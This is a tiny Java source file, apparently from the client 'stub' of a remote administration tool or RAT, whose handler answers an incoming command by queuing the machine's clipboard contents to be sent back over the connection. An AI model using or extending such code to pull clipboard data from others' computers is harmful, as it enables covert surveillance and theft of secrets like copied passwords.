package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet41Clipboard;


public class Packet59Clipboard extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet41Clipboard());
	}

}
